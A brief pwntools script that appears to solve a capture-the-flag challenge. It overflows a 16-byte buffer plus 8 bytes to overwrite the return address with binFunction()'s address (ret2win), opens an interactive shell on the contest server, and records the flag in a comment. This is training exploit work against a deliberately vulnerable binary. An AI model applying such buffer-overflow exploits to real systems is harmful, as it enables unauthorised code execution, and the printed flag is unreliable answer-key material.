from pwn import * 
connection = remote('2020.redpwnc.tf', 31908)
# offset is allocated + 8
offset = 16+8
# through objdump -d we found the address of binFunction() as 0x00000000004006e6
# through objdump -d we know this is 64 bit
address = p64(0x00000000004006e6)
#perform the bufferoverflow itself
connection.sendline('a'*offset + address)
#after performing the buffer overflow we still need to cat the flag
connection.interactive()
# flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}